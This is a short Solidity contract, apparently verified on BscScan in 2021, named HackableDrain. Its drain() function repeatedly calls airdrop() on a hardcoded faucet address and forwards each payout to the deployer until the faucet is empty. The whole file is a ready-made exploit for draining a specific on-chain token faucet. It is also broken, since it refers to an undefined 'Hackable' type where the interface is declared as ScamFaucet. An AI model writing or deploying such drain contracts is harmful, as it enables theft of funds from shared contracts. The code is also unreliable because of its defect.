/**
 *Submitted for verification at BscScan.com on 2021-06-21
*/

pragma solidity =0.7.6;

contract HackableDrain {

    // Should edit this.
    address public constant Hackable_ADDRESS = 0xFcF2774cD61743fF7C34607Fadf3C84FC4762029;
    address public constant SCAM_ADDRESS = 0xdb78FcBb4f1693FDBf7a85E970946E4cE466E2A9;
    
	address owner_;
	
    constructor() {
        owner_ = msg.sender;
    } 
    
    function drain() public {
        Hackable faucet = Hackable(Hackable_ADDRESS);
        
        BEP20 scamtoken = BEP20(SCAM_ADDRESS);
		
		uint256 airdropsize = faucet.airdropSize();
		uint256 balance = scamtoken.balanceOf(Hackable_ADDRESS);
        
		require(balance >= airdropsize, "NOT FUNDED");
		
        do {
            //airdrop to this contract
            faucet.airdrop();
            //send from this contract to the caller
            scamtoken.transfer(owner_, airdropsize);
            
            //repeat until faucet is no longer funded
            balance = balance - airdropsize;
        } while (balance >= airdropsize);
    }
}

abstract contract ScamFaucet {
    uint256 public airdropSize;
    
    function isFaucetFunded() virtual external view returns(bool);
    function canAddressReceive(address adr) virtual public view returns(bool);
    function airdrop() virtual public ;
}

abstract contract BEP20 {
    
    
    function balanceOf(address tokenOwner) virtual external view returns (uint256);
    function transfer(address receiver, uint256 numTokens) virtual public returns (bool);
    function totalSupply() virtual external view returns (uint256);
}